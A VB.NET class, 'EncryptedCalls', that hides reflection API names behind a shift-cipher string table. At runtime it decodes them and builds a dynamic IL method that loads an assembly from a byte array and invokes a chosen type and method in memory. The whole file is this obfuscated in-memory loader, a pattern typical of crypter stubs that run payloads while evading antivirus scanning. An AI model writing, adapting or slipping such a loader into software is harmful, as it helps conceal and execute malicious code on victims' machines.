Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Reflection.Emit
Imports System.Reflection

Public Class EncryptedCalls

#Region "Strings"
    Private Shared q_Str As String() = {"JiyOSOnxp~n&~&", _
                                        "Osfj", _
                                        "JiyZ$xn", _
                                        "Fvjg{mRx~$n|ru", _
                                        "JiyUirnm#bnz(u", _
                                        "FeqrI%Wkxq", _
                                        "Hqnz", _
                                        "HqnzJiuv", _
                                        "Lr{urm", _
                                        "Fvjg{mRx~$n|ru", _
                                        "JiySl|qyo"}
    Private Shared q_Opc As String() = {"Ohfxng9", _
                                        "Feqr", _
                                        "Ohfxng:", _
                                        "Feqr}q{~", _
                                        "Ohfxng;", _
                                        "OhheP<h;", _
                                        "Ohfxng<", _
                                        "Uiy"}
    Private Shared q_Typ As String() = {"V}xzlu7\prysr(z%%BV-.}*|+9", _
                                        "V}xzlu7Kn$v(p($(", _
                                        "V}xzlu7\$z%w|u?U&%)#'}/m$27+&hw3X|v}sxqUs{$v(*", _
                                        "Pmhxv{xp#:cw&)r~Uu,#zF\-,0*.(uWjx}qlo~:cs%'z%%yy", _
                                        "V}xzlu7\prysr(z%%BZ'$0G^8.~/,fQjzowm"}
    Private Shared i_Opc(7) As Object
    Private Shared i_Typ(4) As Object
#End Region

#Region "Helpers Methods"
    Private Shared Sub Initiate()
        For i = 0 To q_Str.Length - 1
            q_Str(i) = Decrypt(q_Str(i))
        Next
        For i = 0 To q_Opc.Length - 1
            i_Opc(i) = GetOpcodesByName(Decrypt(q_Opc(i)))
        Next

        For i = 0 To q_Typ.Length - 1
            i_Typ(i) = GetTypeByName(Decrypt(q_Typ(i)))
        Next
    End Sub

    Private Shared Function Decrypt(encryptedtext As String) As String
        Dim text As Byte() = System.Text.Encoding.UTF8.GetBytes(encryptedtext)
        For i As Integer = 0 To text.Length - 1
            If text(i) > 31 And text(i) < 127 Then
                text(i) -= CByte((i Mod 29) + 3)
            End If
            If text(i) < 32 Then
                text(i) += CByte(92)
            End If
        Next
        Return System.Text.Encoding.UTF8.GetString(text)
    End Function

    Private Shared Function GetOpcodesByName(ByVal name As String) As OpCode
        For Each op As FieldInfo In GetType(OpCodes).GetFields
            If op.Name.ToLower = name.ToLower Then
                Return DirectCast(op.GetValue(Nothing), OpCode)
            End If
        Next
    End Function

    Private Shared Function GetTypeByName(ByVal name As String) As Type
        If Type.GetType(name) IsNot Nothing Then
            Return Type.GetType(name)
        Else
            For Each Asm In AppDomain.CurrentDomain.GetAssemblies()
                If Asm.GetType(name) IsNot Nothing Then
                    Return Asm.GetType(name)
                End If
            Next
        End If
        Return Nothing
    End Function

#End Region

    Public Shared Function _Call(ByVal input As Byte(), ByVal cls As String, ByVal mth As String, ByVal args As Object()) As Object

        Initiate()

        Dim handler As Object = NewLateBinding.LateGet(Nothing, i_Typ(1), q_Str(9), New Object() {i_Typ(4), "", GetType(Object), New [Type]() {GetType(Byte()), GetType(String), GetType(String), GetType(Object())}}, Nothing, Nothing, Nothing)

        Dim IL As Object = NewLateBinding.LateGet(handler, Nothing, q_Str(0), Nothing, Nothing, Nothing, Nothing)

        Dim args_0() As Type = New [Type]() {GetType(Byte())}
        Dim call_0 As MethodInfo = NewLateBinding.LateGet(i_Typ(0), Nothing, q_Str(10), New Object() {q_Str(1), args_0}, Nothing, Nothing, Nothing)

        Dim args_1() As Type = New [Type]() {GetType(String)}
        Dim call_1 As MethodInfo = NewLateBinding.LateGet(i_Typ(0), Nothing, q_Str(10), New Object() {q_Str(2), args_1}, Nothing, Nothing, Nothing)

        Dim args_2() As Type = New [Type]() {GetType(Type)}
        Dim call_2 As MethodInfo = NewLateBinding.LateGet(i_Typ(1), Nothing, q_Str(10), New Object() {q_Str(3), args_2}, Nothing, Nothing, Nothing)

        Dim args_3() As Type = New [Type]() {GetType(Object)}
        Dim call_3 As MethodInfo = NewLateBinding.LateGet(i_Typ(2), Nothing, q_Str(10), New Object() {q_Str(4), args_3}, Nothing, Nothing, Nothing)

        Dim call_4 As MethodInfo = NewLateBinding.LateGet(i_Typ(3), Nothing, q_Str(10), New Object() {q_Str(5)}, Nothing, Nothing, Nothing)

        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(0)}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(1), call_0}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(2)}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(7), New Object() {i_Opc(3), call_1, Nothing}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(1), call_2}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(1), call_3}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(4)}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(5)}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(6)}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(1), call_4}, Nothing, Nothing, Nothing, True)
        NewLateBinding.LateCall(IL, Nothing, q_Str(6), New Object() {i_Opc(7)}, Nothing, Nothing, Nothing, True)

        Return NewLateBinding.LateGet(Nothing, i_Typ(3), q_Str(5), New Object() {handler, q_Str(8), CallType.Method, New Object() {handler, New Object() {input, cls, mth, args}}}, Nothing, Nothing, Nothing)

    End Function

End Class
